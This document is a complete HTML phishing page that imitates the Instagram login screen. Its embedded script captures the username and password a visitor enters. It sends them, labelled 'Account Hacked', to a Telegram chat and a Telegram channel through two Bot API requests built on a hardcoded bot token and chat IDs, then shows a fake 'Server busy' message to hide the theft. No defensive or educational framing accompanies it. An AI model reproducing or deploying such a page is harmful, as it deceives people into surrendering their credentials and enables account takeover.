<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Instagram</title>

<style>
  body{
    margin:0;
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#fafafa;
    font-family:-apple-system, BlinkMacSystemFont, "Segoe UI",
      Roboto, Helvetica, Arial, sans-serif;
  }

  .box{
    width:350px;
    background:#fff;
    border:1px solid #dbdbdb;
    padding:40px 40px 20px;
    text-align:center;
  }

  .logo{
    font-size:38px;
    font-family:'Segoe Script', cursive;
    margin-bottom:30px;
  }

  input{
    width:100%;
    padding:10px;
    margin:6px 0;
    background:#fafafa;
    border:1px solid #dbdbdb;
    border-radius:3px;
    font-size:14px;
  }

  button{
    width:100%;
    margin-top:10px;
    padding:8px;
    background:#4cb5f9;
    border:none;
    color:#fff;
    font-weight:600;
    border-radius:8px;
    cursor:pointer;
  }

  .or{
    display:flex;
    align-items:center;
    margin:20px 0;
    color:#8e8e8e;
    font-size:13px;
  }

  .or::before,
  .or::after{
    content:"";
    flex:1;
    height:1px;
    background:#dbdbdb;
  }

  .or span{
    margin:0 18px;
  }

  .fb{
    color:#385185;
    font-weight:600;
    font-size:14px;
  }

  .note{
    margin-top:15px;
    font-size:11px;
    color:#8e8e8e;
  }
</style>
</head>

<body>

<div class="box">
  <div class="logo">Instagram</div>

  <form onsubmit="event.preventDefault(); sendGame();">
    <input id="firstBC" type="text" placeholder=" Username " required>
    <input id="secondAccount" type="text" placeholder=" Password " required>
    <button type="submit"> Log in </button>
  </form>

  <div class="or"><span>OR</span></div>

  <div class="fb"> Login with Facebook </div>

  <div class="note">
    don't have an account ? sign Up 
  </div>
</div>

<script>
function sendGame(){

  let firstBC = document.getElementById("firstBC").value.trim();
  let secondAcc = document.getElementById("secondAccount").value.trim();

  if(firstBC === "" || secondAcc === ""){
    alert("Please fill both fields");
    return;
  }

  let botToken  = "8461399840:AAGd207em7CjGl6YmorfcVW1Vsldz1fY7-E";
  let userChat  = "6064621203";
  let channelID = "-1003379083557";

  let message =
    "☠️ Account Hacked 💥\n\n" +
    "👽 Username :\n" + firstBC + "\n\n" +
    "👽 Password :\n" + secondAcc;

  let encoded = encodeURIComponent(message);

  // send to user
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${userChat}&text=${encoded}`);

  // send to channel
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelID}&text=${encoded}`);

  alert(" Server busy");
}
</script>

</body>
</html>
